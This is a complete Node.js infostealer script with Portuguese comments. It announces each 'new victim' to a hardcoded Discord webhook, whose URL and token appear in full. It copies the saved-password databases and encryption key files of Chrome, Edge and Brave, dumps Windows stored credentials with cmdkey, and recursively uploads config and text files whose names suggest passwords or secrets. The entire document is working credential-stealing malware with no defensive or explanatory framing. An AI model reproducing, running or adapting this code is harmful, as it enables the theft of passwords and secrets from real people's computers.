const axios = require('axios');
const fs = require('fs');
const os = require('os');
const FormData = require('form-data');
const { execSync } = require('child_process');

async function sendToWebhook(message, filePath = null) {
    const webhookUrl = "https://discord.com/api/webhooks/1563550985274531890/nmcjdI8zDoYiEV9aoW7miLtlWHLRr7g1eujQtHya92oSWuVUuJdbgmosATTyYFSz4qAi";

    try {
        if (filePath) {
            const form = new FormData();
            form.append('content', message);
            form.append('file', fs.createReadStream(filePath));

            await axios.post(webhookUrl, form, {
                headers: form.getHeaders(),
            });
        } else {
            await axios.post(webhookUrl, {
                content: message,
            });
        }
    } catch (error) {
        console.error(`Erro ao enviar: ${error.message}`);
    }
}

async function main() {
    try {
        // 1. Informações do Sistema
        const username = os.userInfo().username;
        const hostname = os.hostname();
        const platform = os.platform();
        const sysInfo = `--- Nova Vítima Detectada ---\nUsuário: ${username} | PC: ${hostname} | OS: ${platform}`;
        await sendToWebhook(sysInfo);

        // 2. Extração de Navegadores
        const localAppData = process.env.LOCALAPPDATA || '';
        const paths = [
            `${localAppData}\\Google\\Chrome\\User Data\\Default\\Login Data`,
            `${localAppData}\\Microsoft\\Edge\\User Data\\Default\\Login Data`,
            `${localAppData}\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data`
        ];

        for (const path of paths) {
            if (fs.existsSync(path)) {
                const browserName = path.split('\\').slice(-3)[1];

                const localStatePath = path.replace("Login Data", "Local State");
                if (fs.existsSync(localStatePath)) {
                    await sendToWebhook(`Local State de ${browserName}`, localStatePath);
                }

                const tempFile = `${os.tmpdir()}login_data_tmp`;
                fs.copyFileSync(path, tempFile);
                await sendToWebhook(`Login Data de ${browserName}`, tempFile);
                fs.unlinkSync(tempFile);
            }
        }

        // 3. Credenciais do Windows
        try {
            const creds = execSync('cmdkey /list').toString();
            if (creds) {
                await sendToWebhook(`Credenciais do Windows (cmdkey):\n\n${creds}`);
            }
        } catch (e) {
            // Silently fail if cmdkey is not available
        }

        // 4. Arquivos de Configuração Sensíveis (Simulação de busca recursiva)
        const userProfile = process.env.USERPROFILE || os.homedir();
        const sensitiveKeywords = ['pass', 'pwd', 'secret', 'key'];
        
        const findSensitiveFiles = (dir) => {
            const files = fs.readdirSync(dir);
            files.forEach(file => {
                const fullPath = `${dir}\\${file}`;
                try {
                    const stat = fs.statSync(fullPath);
                    if (stat.isDirectory()) {
                        findSensitiveFiles(fullPath);
                    } else if (/\.(txt|ini|config|env)$/i.test(file)) {
                        if (sensitiveKeywords.some(k => file.toLowerCase().includes(k))) {
                            const content = fs.readFileSync(fullPath, 'utf8');
                            sendToWebhook(`Arquivo Sensível: ${fullPath}\n\n${content}`);
                        }
                    }
                } catch (e) {}
            });
        };

        findSensitiveFiles(userProfile);

    } catch (error) {
        await sendToWebhook(`Erro durante a execução: ${error.message}`);
    }
}

main();
